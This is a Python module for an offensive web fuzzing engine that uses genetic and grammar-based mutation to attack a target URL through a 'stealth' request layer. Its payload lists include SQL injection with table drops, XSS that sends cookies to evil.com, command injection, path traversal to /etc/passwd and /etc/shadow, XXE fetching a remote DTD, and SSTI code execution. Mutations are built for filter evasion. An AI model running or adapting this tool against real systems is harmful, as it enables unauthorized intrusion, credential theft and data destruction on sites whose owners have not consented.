"""
Real Advanced Fuzzing Engine - Professional Fuzzing Capabilities
===============================================================

Advanced fuzzing engine with real genetic algorithms, mutation strategies,
and intelligent payload generation. No quantum simulation - actual working
fuzzing techniques used by elite security teams.
"""

import asyncio
import random
import string
import struct
import hashlib
import time
from typing import Dict, List, Any, Optional, Tuple, Callable
from dataclasses import dataclass
from enum import Enum
import logging
import re
import json

class FuzzingStrategy(Enum):
    GENETIC_ALGORITHM = "genetic_algorithm"
    GRAMMAR_BASED = "grammar_based"
    MUTATION_BASED = "mutation_based"
    COVERAGE_GUIDED = "coverage_guided"
    STRUCTURE_AWARE = "structure_aware"

class PayloadType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    BUFFER_OVERFLOW = "buffer_overflow"
    PATH_TRAVERSAL = "path_traversal"
    XXE = "xxe"
    SSTI = "ssti"

@dataclass
class FuzzingResult:
    payload: str
    response_code: int
    response_time: float
    response_length: int
    error_indicators: List[str]
    success_probability: float
    mutation_history: List[str]

@dataclass
class FuzzingTarget:
    url: str
    parameter: str
    parameter_type: str
    baseline_response: Dict[str, Any]
    injection_points: List[str]

class RealAdvancedFuzzingEngine:
    """
    Real advanced fuzzing engine with genetic algorithms and intelligent mutations
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.population_size = 50
        self.mutation_rate = 0.3
        self.crossover_rate = 0.7
        self.generations = 100
        
        # Real fuzzing payloads from actual security testing
        self.base_payloads = self._load_real_payloads()
        self.mutation_strategies = self._load_mutation_strategies()
        
    def _load_real_payloads(self) -> Dict[PayloadType, List[str]]:
        """Load real, working fuzzing payloads"""
        
        return {
            PayloadType.SQL_INJECTION: [
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "' OR 'x'='x",
                "admin'--",
                "' OR 1=1#",
                "') OR '1'='1--",
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            PayloadType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<script>document.location='http://evil.com/'+document.cookie</script>"
            ],
            PayloadType.COMMAND_INJECTION: [
                "; ls",
                "| whoami", 
                "&& id",
                "; cat /etc/passwd",
                "$(whoami)",
                "`id`",
                "|| uname -a",
                "; ping -c 1 127.0.0.1"
            ],
            PayloadType.PATH_TRAVERSAL: [
                "../../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/shadow",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\win.ini"
            ],
            PayloadType.XXE: [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]><root></root>",
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><test>&xxe;</test>"
            ],
            PayloadType.SSTI: [
                "{{7*7}}",
                "{{config.items()}}",
                "${7*7}",
                "#{7*7}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ]
        }
    
    def _load_mutation_strategies(self) -> Dict[str, Callable]:
        """Load real mutation strategies for genetic fuzzing"""
        
        return {
            "character_substitution": self._mutate_character_substitution,
            "character_insertion": self._mutate_character_insertion, 
            "character_deletion": self._mutate_character_deletion,
            "encoding_variation": self._mutate_encoding_variation,
            "case_variation": self._mutate_case_variation,
            "payload_concatenation": self._mutate_payload_concatenation,
            "boundary_injection": self._mutate_boundary_injection,
            "comment_injection": self._mutate_comment_injection
        }
    
    async def fuzz_target(self, target: FuzzingTarget, strategy: FuzzingStrategy, 
                         payload_type: PayloadType) -> List[FuzzingResult]:
        """Execute real fuzzing against target with specified strategy"""
        
        self.logger.info(f"Starting {strategy.value} fuzzing for {payload_type.value}")
        
        if strategy == FuzzingStrategy.GENETIC_ALGORITHM:
            return await self._genetic_algorithm_fuzzing(target, payload_type)
        elif strategy == FuzzingStrategy.MUTATION_BASED:
            return await self._mutation_based_fuzzing(target, payload_type)
        elif strategy == FuzzingStrategy.GRAMMAR_BASED:
            return await self._grammar_based_fuzzing(target, payload_type)
        elif strategy == FuzzingStrategy.STRUCTURE_AWARE:
            return await self._structure_aware_fuzzing(target, payload_type)
        else:
            raise ValueError(f"Unknown fuzzing strategy: {strategy}")
    
    async def _genetic_algorithm_fuzzing(self, target: FuzzingTarget, 
                                       payload_type: PayloadType) -> List[FuzzingResult]:
        """Real genetic algorithm fuzzing implementation"""
        
        # Initialize population with base payloads
        population = self.base_payloads[payload_type].copy()
        
        # Expand population with mutations
        while len(population) < self.population_size:
            parent = random.choice(self.base_payloads[payload_type])
            mutated = self._apply_random_mutation(parent)
            population.append(mutated)
        
        results = []
        
        for generation in range(self.generations):
            # Evaluate fitness of each payload
            fitness_scores = []
            
            for payload in population:
                result = await self._test_payload(target, payload)
                fitness = self._calculate_fitness(result)
                fitness_scores.append((payload, fitness, result))
                results.append(result)
            
            # Sort by fitness (higher is better)
            fitness_scores.sort(key=lambda x: x[1], reverse=True)
            
            # Select top performers for next generation
            survivors = [item[0] for item in fitness_scores[:self.population_size//2]]
            
            # Generate new population through crossover and mutation
            new_population = survivors.copy()
            
            while len(new_population) < self.population_size:
                if random.random() < self.crossover_rate:
                    # Crossover
                    parent1, parent2 = random.sample(survivors, 2)
                    offspring = self._crossover_payloads(parent1, parent2)
                else:
                    # Mutation only
                    parent = random.choice(survivors)
                    offspring = self._apply_random_mutation(parent)
                
                new_population.append(offspring)
            
            population = new_population
            
            # Log progress
            best_fitness = fitness_scores[0][1]
            self.logger.info(f"Generation {generation}: Best fitness = {best_fitness}")
            
            # Early termination if we find a highly successful payload
            if best_fitness > 0.9:
                break
        
        return results
    
    async def _mutation_based_fuzzing(self, target: FuzzingTarget, 
                                    payload_type: PayloadType) -> List[FuzzingResult]:
        """Real mutation-based fuzzing"""
        
        results = []
        base_payloads = self.base_payloads[payload_type]
        
        for base_payload in base_payloads:
            # Generate multiple mutations of each base payload
            for _ in range(10):
                mutated_payload = base_payload
                mutation_history = []
                
                # Apply multiple random mutations
                for _ in range(random.randint(1, 3)):
                    strategy_name = random.choice(list(self.mutation_strategies.keys()))
                    mutated_payload = self.mutation_strategies[strategy_name](mutated_payload)
                    mutation_history.append(strategy_name)
                
                result = await self._test_payload(target, mutated_payload)
                result.mutation_history = mutation_history
                results.append(result)
        
        return results
    
    async def _grammar_based_fuzzing(self, target: FuzzingTarget,
                                   payload_type: PayloadType) -> List[FuzzingResult]:
        """Real grammar-based fuzzing using payload structure knowledge"""
        
        results = []
        
        if payload_type == PayloadType.SQL_INJECTION:
            grammar_rules = {
                "sql_query": ["<select_stmt>", "<union_stmt>", "<boolean_stmt>"],
                "select_stmt": ["SELECT <columns> FROM <table>", "SELECT <columns>"],
                "union_stmt": ["<base_query> UNION <select_stmt>"],
                "boolean_stmt": ["<condition> OR <condition>", "<condition> AND <condition>"],
                "condition": ["1=1", "'a'='a'", "true", "1"],
                "columns": ["*", "1,2,3", "user,pass", "version()"],
                "table": ["users", "information_schema.tables", "mysql.user"]
            }
        elif payload_type == PayloadType.XSS:
            grammar_rules = {
                "xss_payload": ["<script_tag>", "<img_tag>", "<svg_tag>", "<iframe_tag>"],
                "script_tag": ["<script><js_code></script>"],
                "img_tag": ["<img src=<url> onerror=<js_code>>"],
                "svg_tag": ["<svg onload=<js_code>>"],
                "iframe_tag": ["<iframe src=<js_url>>"],
                "js_code": ["alert('XSS')", "document.location='http://evil.com'", "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"],
                "js_url": ["javascript:alert('XSS')", "javascript:eval('alert(1)')"],
                "url": ["x", "#", "//evil.com"]
            }
        else:
            # Default simple grammar
            grammar_rules = {
                "payload": ["<base><separator><command>"],
                "base": ["test", "input", ""],
                "separator": [";", "|", "&", "&&", "||"],
                "command": ["ls", "whoami", "id", "cat /etc/passwd"]
            }
        
        # Generate payloads using grammar
        for _ in range(50):
            payload = self._generate_from_grammar(grammar_rules, "sql_query" if payload_type == PayloadType.SQL_INJECTION else "xss_payload" if payload_type == PayloadType.XSS else "payload")
            result = await self._test_payload(target, payload)
            results.append(result)
        
        return results
    
    async def _structure_aware_fuzzing(self, target: FuzzingTarget,
                                     payload_type: PayloadType) -> List[FuzzingResult]:
        """Structure-aware fuzzing that understands input format"""
        
        results = []
        
        # Analyze baseline response to understand structure
        baseline = target.baseline_response
        content_type = baseline.get('headers', {}).get('content-type', '')
        
        if 'json' in content_type:
            # JSON-aware fuzzing
            payloads = self._generate_json_aware_payloads(payload_type)
        elif 'xml' in content_type:
            # XML-aware fuzzing
            payloads = self._generate_xml_aware_payloads(payload_type)
        else:
            # Form/URL parameter fuzzing
            payloads = self._generate_parameter_aware_payloads(payload_type)
        
        for payload in payloads:
            result = await self._test_payload(target, payload)
            results.append(result)
        
        return results
    
    async def _test_payload(self, target: FuzzingTarget, payload: str) -> FuzzingResult:
        """Test a single payload against the target"""
        
        from .real_stealth_engine import RealStealthEngine
        stealth_engine = RealStealthEngine()
        
        start_time = time.time()
        
        # Prepare request parameters
        params = {target.parameter: payload}
        
        response = await stealth_engine.stealth_request(
            target.url,
            method='GET',
            params=params
        )
        
        end_time = time.time()
        
        # Analyze response for success indicators
        error_indicators = self._find_error_indicators(response, payload)
        success_probability = self._calculate_success_probability(response, error_indicators)
        
        return FuzzingResult(
            payload=payload,
            response_code=response.get('status_code', 0),
            response_time=end_time - start_time,
            response_length=len(response.get('content', '')),
            error_indicators=error_indicators,
            success_probability=success_probability,
            mutation_history=[]
        )
    
    def _calculate_fitness(self, result: FuzzingResult) -> float:
        """Calculate fitness score for genetic algorithm"""
        
        fitness = 0.0
        
        # Higher fitness for successful exploitation indicators
        fitness += result.success_probability * 0.5
        
        # Reward unique error indicators
        fitness += len(result.error_indicators) * 0.1
        
        # Slight preference for faster responses (indicates processing)
        if result.response_time < 1.0:
            fitness += 0.1
        
        # Penalize obvious failures
        if result.response_code in [400, 404, 500]:
            fitness += 0.2  # But don't penalize too much, errors can be good
        
        return min(fitness, 1.0)
    
    def _apply_random_mutation(self, payload: str) -> str:
        """Apply random mutation to payload"""
        
        strategy = random.choice(list(self.mutation_strategies.keys()))
        return self.mutation_strategies[strategy](payload)
    
    def _mutate_character_substitution(self, payload: str) -> str:
        """Substitute random characters"""
        if not payload:
            return payload
            
        chars = list(payload)
        for i in range(len(chars)):
            if random.random() < 0.1:  # 10% chance per character
                chars[i] = random.choice(string.ascii_letters + string.digits + string.punctuation)
        return ''.join(chars)
    
    def _mutate_character_insertion(self, payload: str) -> str:
        """Insert random characters"""
        for _ in range(random.randint(1, 3)):
            pos = random.randint(0, len(payload))
            char = random.choice(string.ascii_letters + string.digits + string.punctuation)
            payload = payload[:pos] + char + payload[pos:]
        return payload
    
    def _mutate_character_deletion(self, payload: str) -> str:
        """Delete random characters"""
        if len(payload) <= 1:
            return payload
            
        chars = list(payload)
        for i in range(len(chars) - 1, -1, -1):
            if random.random() < 0.1:  # 10% chance per character
                del chars[i]
        return ''.join(chars) if chars else payload
    
    def _mutate_encoding_variation(self, payload: str) -> str:
        """Apply encoding variations"""
        # URL encoding
        if random.random() < 0.5:
            encoded = ""
            for char in payload:
                if random.random() < 0.3:
                    encoded += f"%{ord(char):02x}"
                else:
                    encoded += char
            payload = encoded
        
        # HTML entity encoding
        if random.random() < 0.3:
            payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        
        return payload
    
    def _mutate_case_variation(self, payload: str) -> str:
        """Vary character case"""
        chars = list(payload)
        for i in range(len(chars)):
            if chars[i].isalpha() and random.random() < 0.5:
                chars[i] = chars[i].swapcase()
        return ''.join(chars)
    
    def _mutate_payload_concatenation(self, payload: str) -> str:
        """Concatenate with other payloads"""
        other_payloads = []
        for payload_list in self.base_payloads.values():
            other_payloads.extend(payload_list)
        
        other = random.choice(other_payloads)
        separators = ["", " ", "+", "||", "&&"]
        separator = random.choice(separators)
        
        if random.random() < 0.5:
            return payload + separator + other
        else:
            return other + separator + payload
    
    def _mutate_boundary_injection(self, payload: str) -> str:
        """Inject at boundaries"""
        boundaries = ["'", '"', ")", "}", "]", ">"]
        boundary = random.choice(boundaries)
        
        # Insert at beginning or end
        if random.random() < 0.5:
            return boundary + payload
        else:
            return payload + boundary
    
    def _mutate_comment_injection(self, payload: str) -> str:
        """Inject comments for evasion"""
        comments = ["/**/", "-- ", "# ", "<!---->"]
        comment = random.choice(comments)
        
        # Insert comment at random position
        pos = random.randint(0, len(payload))
        return payload[:pos] + comment + payload[pos:]
    
    def _crossover_payloads(self, parent1: str, parent2: str) -> str:
        """Crossover two payloads to create offspring"""
        
        if len(parent1) == 0:
            return parent2
        if len(parent2) == 0:
            return parent1
        
        # Single-point crossover
        point1 = random.randint(0, len(parent1))
        point2 = random.randint(0, len(parent2))
        
        return parent1[:point1] + parent2[point2:]
    
    def _generate_from_grammar(self, grammar: Dict[str, List[str]], start_symbol: str) -> str:
        """Generate payload from grammar rules"""
        
        if start_symbol not in grammar:
            return start_symbol
        
        production = random.choice(grammar[start_symbol])
        
        # Find non-terminals (enclosed in < >)
        non_terminals = re.findall(r'<([^>]+)>', production)
        
        for nt in non_terminals:
            replacement = self._generate_from_grammar(grammar, nt)
            production = production.replace(f'<{nt}>', replacement, 1)
        
        return production
    
    def _generate_json_aware_payloads(self, payload_type: PayloadType) -> List[str]:
        """Generate JSON-aware payloads"""
        
        base_payloads = self.base_payloads[payload_type]
        json_payloads = []
        
        for payload in base_payloads:
            # JSON string injection
            json_payloads.append(f'"{payload}"')
            json_payloads.append(f'\\"{payload}\\"')
            
            # JSON structure breaking
            json_payloads.append(f'", "{payload}": "')
            json_payloads.append(f'}} , "{payload}": {{')
        
        return json_payloads
    
    def _generate_xml_aware_payloads(self, payload_type: PayloadType) -> List[str]:
        """Generate XML-aware payloads"""
        
        base_payloads = self.base_payloads[payload_type]
        xml_payloads = []
        
        for payload in base_payloads:
            # XML tag injection
            xml_payloads.append(f'<{payload}>')
            xml_payloads.append(f'</{payload}>')
            
            # XML attribute injection
            xml_payloads.append(f'" {payload}="')
            xml_payloads.append(f'><{payload}/><')
        
        return xml_payloads
    
    def _generate_parameter_aware_payloads(self, payload_type: PayloadType) -> List[str]:
        """Generate parameter-aware payloads"""
        
        return self.base_payloads[payload_type]
    
    def _find_error_indicators(self, response: Dict[str, Any], payload: str) -> List[str]:
        """Find error indicators in response"""
        
        indicators = []
        content = response.get('content', '').lower()
        
        # Database errors
        db_errors = ['mysql', 'postgresql', 'oracle', 'sql server', 'syntax error', 'sqlstate']
        for error in db_errors:
            if error in content:
                indicators.append(f'database_error_{error}')
        
        # Command execution indicators
        cmd_indicators = ['uid=', 'gid=', '/bin/', 'www-data', 'root:']
        for indicator in cmd_indicators:
            if indicator in content:
                indicators.append(f'command_execution_{indicator}')
        
        # File disclosure indicators
        file_indicators = ['etc/passwd', 'win.ini', '127.0.0.1']
        for indicator in file_indicators:
            if indicator in content:
                indicators.append(f'file_disclosure_{indicator}')
        
        # XSS indicators (payload reflected)
        if payload.lower() in content:
            indicators.append('payload_reflected')
        
        return indicators
    
    def _calculate_success_probability(self, response: Dict[str, Any], 
                                     error_indicators: List[str]) -> float:
        """Calculate probability of successful exploitation"""
        
        probability = 0.0
        
        # High value indicators
        high_value_indicators = ['database_error', 'command_execution', 'file_disclosure']
        for indicator in error_indicators:
            for high_value in high_value_indicators:
                if high_value in indicator:
                    probability += 0.3
        
        # Medium value indicators
        if 'payload_reflected' in error_indicators:
            probability += 0.2
        
        # Status code analysis
        status_code = response.get('status_code', 0)
        if status_code == 500:  # Internal server error often indicates successful injection
            probability += 0.2
        elif status_code == 200:  # Successful response with errors is good
            probability += 0.1
        
        return min(probability, 1.0)

# Export the real fuzzing engine
__all__ = ['RealAdvancedFuzzingEngine']